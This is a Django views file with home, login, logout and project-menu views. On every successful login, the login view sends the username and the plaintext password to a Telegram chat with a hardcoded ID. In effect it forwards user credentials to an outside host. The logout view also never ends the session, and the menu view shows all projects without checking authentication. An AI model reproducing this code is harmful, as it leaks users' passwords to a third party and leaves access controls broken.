from django.shortcuts import render,redirect
from django.contrib.auth import authenticate,login,logout
from django.contrib import messages
from logdata_and_tel.tele import send_telegram_message
from adminapp.models import Projects

# Create your views here.
chat_id = "-1002396692153"
# ##################################################################
def vhome(request):
    return render(request, 'home.html')
# login page 
def vlogin(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        print(username)
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            send_telegram_message(chat_id, message=f"{request.user} {password} logged in")
# get project name
            # try:
            #     project_name = UserProjectPermission.objects.filter(user=request.user).first().project_name
            #     project_name = project_name.capitalize()
            # except:
            #     project_name = None
            return redirect('nmenu')
        else:
            messages.error(request, 'Invalid username or password')
    return render(request, 'login.html')
def vlogout(request):
    send_telegram_message(chat_id, message=f"{request.user} logged out")
    return redirect('nlogin')



def vmenu(request):
    projects = Projects.objects.all()
    context = {
        'projects': projects,
        'user': request.user,
    }
    return render(request, 'menu.html', context)
